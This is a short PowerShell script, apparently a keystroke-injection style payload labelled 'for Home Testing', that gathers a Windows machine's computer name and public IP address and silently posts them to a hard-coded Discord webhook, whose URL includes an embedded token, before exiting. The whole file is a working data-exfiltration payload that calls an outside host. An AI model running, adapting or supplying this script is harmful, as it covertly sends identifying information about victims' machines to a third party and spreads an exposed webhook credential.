# Title: System Information Reporter for Home Testing
# Description: Reports system info to specified webhook
# Target: Windows 10/11 

# Define the webhook URL
$webhook = 'https://discord.com/api/webhooks/1310354724846829639/rdpNjafo98okiC97JBXIxDl_23UKsiutlFsxcYv5OI-AfkAr5Wo5Jkxt9Jzgs5OmUTkg'

# Get the computer name
$computerName = $env:COMPUTERNAME

# Get the public IP address
$ip = (Invoke-RestMethod -Uri 'https://api.ipify.org?format=json').ip

# Prepare the payload
$payload = @{
    content = "PC Name: $computerName`nIP: $ip"
} | ConvertTo-Json -Depth 10

# Send the data to the webhook
Invoke-RestMethod -Uri $webhook -Method Post -Body $payload -ContentType 'application/json'

# Exit PowerShell
exit
